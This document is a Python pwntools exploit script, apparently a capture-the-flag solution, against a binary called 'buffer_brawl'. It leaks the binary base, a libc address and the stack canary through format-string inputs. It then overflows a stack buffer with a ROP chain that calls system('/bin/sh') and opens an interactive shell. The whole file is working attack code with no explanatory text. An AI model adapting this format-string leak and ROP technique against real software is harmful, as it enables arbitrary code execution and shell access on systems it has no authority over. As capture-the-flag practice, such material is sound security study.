from pwn import *

p = process('./buffer_brawl')
# gdb.attach(p, api=True)
e = ELF('./buffer_brawl')

libc = e.libc

# mov rdi, rbx: 0x00000000000012d9
# pop rbx: 0x00000000000015fc


# Leak binary base
p.sendlineafter(b'> ', b"4")
p.recvuntil(b'Right or left?')
p.sendline(b'%13$p')
binary_leaked = int(p.recvn(15), 16)
binary_base = binary_leaked - 215 - e.sym['menu']
info("binary base: %#x", binary_base)




def goToStack():
    for i in range(28):
        p.recvuntil(b'> ')
        p.sendline(b"3")
        p.recvuntil(b'life points: ')
        stackLifePoints = int(p.recvn(2), 10)
    return stackLifePoints

# Leak stack
p.sendlineafter(b'> ', b"4")
p.recvuntil(b'Right or left?')
p.sendline(b'%3$p')

leaked = int(p.recvn(15), 16)
info("read leaked: %#x", leaked)



# leak libc
read_leaked = leaked - 13
libc.address = read_leaked - libc.sym['read']
info("libc address: %#x", libc.address)





system = leaked - 0xe4b18
info("system: %#x", system)
binsh = leaked + 0xa4766
info("/bin/sh: %#x", binsh)


pop_rdi = 0x000000000002a205 + libc.address
ret = 0x0000000000001016 + binary_base

system_new = libc.sym.system
info("system_new: %#x", system_new)


p.sendlineafter(b'> ', b"4")
p.recvuntil(b'Right or left?')
p.sendline(b'%11$p')

# Leak canary
canary = int(p.recvn(19), 16)

info("canary: %#x", canary)

# libc_base = leaked - 

goToStack()
# now enter the buffer
p.recvuntil(b'> ')
p.sendline(b"3")
payload = b'A' * 24 + p64(canary) + b'B' * 8
#ROP CHAIN
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_new)
p.recvuntil(b"Enter your move: ")
p.sendline(payload)
p.interactive()